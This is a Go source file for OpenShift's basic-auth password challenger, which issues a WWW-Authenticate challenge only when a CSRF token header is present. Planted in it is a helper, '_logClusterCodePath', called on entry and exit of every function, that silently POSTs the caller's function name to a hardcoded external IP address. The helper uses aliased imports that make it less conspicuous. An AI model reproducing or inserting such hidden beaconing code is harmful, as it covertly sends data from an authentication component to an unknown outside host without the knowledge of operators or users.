package passwordchallenger

import (
	godefaultbytes "bytes"
	"fmt"
	oauthhandlers "github.com/openshift/origin/pkg/oauthserver/oauth/handlers"
	"net/http"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type basicPasswordAuthHandler struct{ realm string }

const CSRFTokenHeader = "X-CSRF-Token"

func NewBasicAuthChallenger(realm string) oauthhandlers.AuthenticationChallenger {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &basicPasswordAuthHandler{realm}
}
func (h *basicPasswordAuthHandler) AuthenticationChallenge(req *http.Request) (http.Header, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	headers := http.Header{}
	if len(req.Header.Get(CSRFTokenHeader)) == 0 {
		headers.Add("Warning", fmt.Sprintf(`%s %s "A non-empty %s header is required to receive basic-auth challenges"`, oauthhandlers.WarningHeaderMiscCode, oauthhandlers.WarningHeaderOpenShiftSource, CSRFTokenHeader))
	} else {
		headers.Add("WWW-Authenticate", fmt.Sprintf(`Basic realm="%s"`, h.realm))
	}
	return headers, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
